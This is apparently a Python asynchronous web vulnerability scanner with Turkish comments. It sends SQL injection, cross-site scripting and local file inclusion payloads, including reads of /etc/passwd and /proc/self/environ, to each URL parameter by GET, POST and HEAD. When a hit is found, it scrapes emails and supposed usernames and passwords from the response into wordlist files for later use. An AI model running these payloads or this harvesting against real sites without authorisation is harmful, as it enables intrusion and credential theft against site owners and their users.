import asyncio
import aiohttp
import re
import os
from urllib.parse import urlparse, parse_qs
from modules.utils.logger import log_error, log_info, log_success, log_warning
from colorama import Fore, Style
import sys
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

SPECIAL_CHARS = "!@#$%^&*()-_=+.,?/"

# Yeni ve genişletilmiş payload listesi (toplam 25+ payload eklendi)
test_payloads = {
    "SQL": [
        "'", "'--", "\"", "\"--", "' OR '1'='1", "' OR 1=1--",
        "admin'--", "' UNION SELECT NULL,NULL,NULL--", "' OR 'a'='a",
        "' OR 1=1#", "' OR 1=1/*", "' OR 1=1 LIMIT 1--"
    ],
    "XSS": [
        "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>", "\"'><script>alert(1)</script>",
        "<body onload=alert(1)>", "<iframe src='javascript:alert(1)'></iframe>"
    ],
    "LFI": [
        "../../../../etc/passwd", "../../../../../etc/passwd", "/etc/passwd",
        "../../../../../proc/self/environ", "../../../boot.ini"
    ]
}

http_methods = ["GET", "POST", "HEAD"]

def print_colored(msg, color=Fore.WHITE):
    print(f"{color}{msg}{Style.RESET_ALL}")

def is_vulnerable(response_text, payload_type):
    text = response_text.lower()

    if payload_type == "SQL":
        error_signatures = [
            "syntax", "mysql", "sql", "odbc", "error in your sql syntax",
            "unterminated string", "warning: mysql", "quoted string not properly terminated"
        ]
        if any(e in text for e in error_signatures):
            return True
    elif payload_type == "XSS":
        if "alert(1)" in response_text or "<script>alert" in response_text:
            return True
    elif payload_type == "LFI":
        if "root:" in text or "bin/bash" in text or "etc/passwd" in text or "boot.ini" in text:
            return True

    return False

def extract_and_update_wordlists(response_text):
    emails = re.findall(r"[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+", response_text)
    usernames = re.findall(r"\b[a-zA-Z]{3,20}\b", response_text)
    passwords = re.findall(r"\b[\w@#$%^&*!]{6,20}\b", response_text)

    def add_to_file(filename, items):
        if not os.path.exists(filename):
            os.makedirs(os.path.dirname(filename), exist_ok=True)
            open(filename, "w").close()
        with open(filename, "r") as f:
            existing = set(line.strip() for line in f)
        new_items = set(items) - existing
        if new_items:
            with open(filename, "a") as f:
                for item in new_items:
                    f.write(item + "\n")
            print(f"[+] {filename} dosyasına {len(new_items)} yeni öğe eklendi.")

    usernames = [u for u in usernames if u not in emails]

    add_to_file("data/username.txt", usernames)
    add_to_file("data/password.txt", passwords)
    add_to_file("data/emails.txt", emails)

async def send_request(session, method, url, param=None, payload=None):
    try:
        if method in ["GET", "HEAD"]:
            async with session.request(method, url, timeout=5) as response:
                text = await response.text()
                return response.status, text
        elif method == "POST" and param and payload:
            data = {param: payload}
            async with session.post(url, data=data, timeout=5) as response:
                text = await response.text()
                return response.status, text
    except Exception as e:
        log_error(f"HTTP isteği hatası: {url} ({method})", e)
        return None, None

async def test_url(session, base, param, payload, method):
    if method in ["GET", "HEAD"]:
        test_url = f"{base}?{param}={payload}"
        print_colored(f"[🧪] {method} ile test ediliyor: {test_url}", Fore.CYAN)
        status, text = await send_request(session, method, test_url)
    elif method == "POST":
        test_url = base
        print_colored(f"[🧪] {method} ile test ediliyor: {test_url} parametre: {param}={payload}", Fore.CYAN)
        status, text = await send_request(session, method, test_url, param, payload)

    return status, text, test_url

async def scan(url):
    log_info(f"Zafiyet taraması başlatılıyor: {url}")

    if "?" not in url:
        log_error("URL parametre içermiyor. Test edilemez.")
        return False

    base, query = url.split("?", 1)
    params = parse_qs(query)

    async with aiohttp.ClientSession() as session:
        tasks = []
        for param in params:
            for payload_type, payload_list in test_payloads.items():
                for payload in payload_list:
                    for method in http_methods:
                        tasks.append(test_url(session, base, param, payload, method))

        results = await asyncio.gather(*tasks)

        for status, text, tested_url in results:
            if not text:
                continue
            for payload_type in test_payloads.keys():
                if is_vulnerable(text, payload_type):
                    log_warning(f"Olası {payload_type} açığı bulundu: {tested_url}")
                    extract_and_update_wordlists(text)
                    return True, text

    log_info("Zafiyet bulunamadı.")
    return False

if __name__ == "__main__":
    import asyncio
    url = input("Test etmek istediğiniz URL'yi girin: ")
    result = asyncio.run(scan(url))
    if result:
        log_success("Tarama tamamlandı ve zafiyet bulundu.")
    else:
        log_info("Tarama tamamlandı, zafiyet bulunamadı.")
